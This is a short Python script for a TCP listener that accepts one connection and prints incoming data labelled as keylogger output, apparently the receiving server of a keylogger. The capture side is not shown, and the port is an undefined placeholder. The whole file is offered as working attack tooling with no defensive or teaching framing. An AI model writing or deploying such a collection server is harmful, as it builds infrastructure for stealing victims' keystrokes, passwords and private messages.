import socket

def start_server(host='0.0.0.0', port=PORT):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f"Listening on {host}:{port}...")

    conn, addr = server.accept()
    print(f"Connection established with {addr}")

    while True:
        data = conn.recv(1024).decode('utf-8')
        if not data:
            break
        print(f"Keylogger data received: {data}")

    conn.close()

if __name__ == "__main__":
    start_server()
